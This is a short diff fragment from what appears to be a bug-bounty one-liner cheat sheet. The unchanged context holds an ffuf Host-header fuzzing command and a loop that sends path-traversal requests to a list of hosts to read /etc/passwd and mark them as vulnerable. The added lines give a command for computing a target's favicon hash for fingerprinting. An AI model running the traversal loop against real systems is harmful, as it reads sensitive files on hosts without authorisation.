@@ -250,3 +250,12 @@ ffuf -u https://target[.]com/FUZZ -H “Host: 127.0.0.1” -w /home/user/path/to
 ```
 cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
 ```
+
+────────────────────────────────────────────────────────────────────────
+
+# Get Favicon Hash of your target Domain
+
+## OneLiner
+```
+curl -s -L -k https://TARGET.COM/favicon.ico | python3 -c 'import mmh3, sys, codecs; print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))'
+```
